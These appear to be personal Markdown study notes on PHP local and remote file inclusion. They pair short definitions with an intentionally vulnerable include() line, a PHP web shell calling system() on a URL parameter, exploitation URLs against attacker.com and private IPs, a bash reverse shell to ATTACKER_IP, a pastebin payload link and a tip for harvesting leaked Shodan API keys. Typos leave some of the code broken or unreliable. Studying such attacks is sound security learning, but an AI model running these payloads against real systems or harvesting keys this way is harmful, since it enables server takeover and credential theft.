
## We have two types of file inclusion 
1. LFI = local file inclusion
2. RFI = remote file inclusion

## Impact of this Bug
1. Code exciusion on server site
2. Code execution on client site
3. Dos (self DOS)
4. Information Disclosure

# LFI
=> Local File Inclusion (LFI) is a web application vulnerability where an application uses unsanitized user input to request and access files stored on the server. By manipulating inputs like URL parameters or cookies, attackers can trick the application into exposing sensitive data or executing malicious code.

# RFI
inc notes


Example vulnerable code :- Programming
vul code:- ```include($_GET['page']);

https://example.com/index.php?page=http://attacker.com/evil.php

if "allow_url_include" is enabled, the server faches and executes the remote file.


Remote file (evil.php): 

```
<?php
echo "<prep?>";
system($_GET['variable/cmd']);
echo "</prep>";
?>
# OR

<?php
exe($_GET['variable/cmd']);
?>

#save as "evil.php"  to execute it locally

#to execute it remote server not in your server then:- 
# Save by just filename  'evil' dont give any extention
```

### TO make php server locally
php server php -S your_ip:80

#### php execution:
https://example.com/index.php?page=http://attacker.com/evil.php&cmd=id

http://192.168.46.235:9004/?file=http://192.168.47.167/evil&cmdi=id

http://192.168.46.235:9004/?file=https://www.adda247.com/images/fpmbanner-update.svg


```bash -i >& /dev/tcp/ATTACKER_IP/4123 0>&1```

https://pastebin.com/raw/xdR7DSEM




for keys:- https://grep.app/search?q=shodan
SHODAN_API_KEY={[]}
